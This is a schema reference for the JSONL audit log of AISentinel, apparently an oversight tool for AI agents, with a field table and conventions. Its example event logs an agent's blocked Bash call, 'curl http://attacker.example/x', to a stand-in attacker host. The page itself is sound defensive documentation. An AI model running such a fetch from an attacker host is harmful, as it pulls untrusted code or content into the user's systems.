# Event Schema

AISentinel writes one JSON object per line to a `.jsonl` file. This schema
is **mandatory** — clients of the audit log depend on field names and types.

## Field reference

| Field | Type | Required | Description |
|---|---|---|---|
| `event_id` | string | yes | Unique event identifier (ULID-ish, monotonic). |
| `timestamp` | string (RFC3339, UTC) | yes | When the event happened. |
| `event_type` | enum | yes | One of: `pre_tool`, `post_tool`, `prompt`, `decision`, `system`. |
| `agent_id` | string | no | Identifier of the calling agent. |
| `session_id` | string | no | Identifier of the agent session. |
| `tool_name` | string | conditional | Required for `pre_tool` / `post_tool`. |
| `tool_args` | object | no | The arguments passed to the tool. |
| `tool_result` | object | no | The tool's response (for `post_tool`). |
| `decision` | enum | no | One of: `allow`, `block`, `require_human_approval`, `log_only`. |
| `policy_matched` | string[] | no | List of rule IDs that matched (in order). |
| `risk_signals` | string[] | no | Tags describing the risk (`rule_matched:<id>`, `secret_pattern_detected`, …). |
| `metadata` | object | no | Free-form additional fields. |

## Example

```json
{
  "event_id": "20260707T221500.000000001-1",
  "timestamp": "2026-07-07T22:15:00Z",
  "event_type": "pre_tool",
  "agent_id": "agent-42",
  "session_id": "sess-abc",
  "tool_name": "Bash",
  "tool_args": { "command": "curl http://attacker.example/x" },
  "decision": "block",
  "policy_matched": ["bash-network"],
  "risk_signals": ["rule_matched:bash-network"]
}
```

## Conventions

- Timestamps are **always UTC** with a `Z` suffix.
- Field order is not significant; readers must not depend on it.
- Unknown fields must be preserved on round-trip.
- Numeric counts must be JSON numbers, not strings.
- File names: `events-YYYY-MM-DD.jsonl`, rotated daily.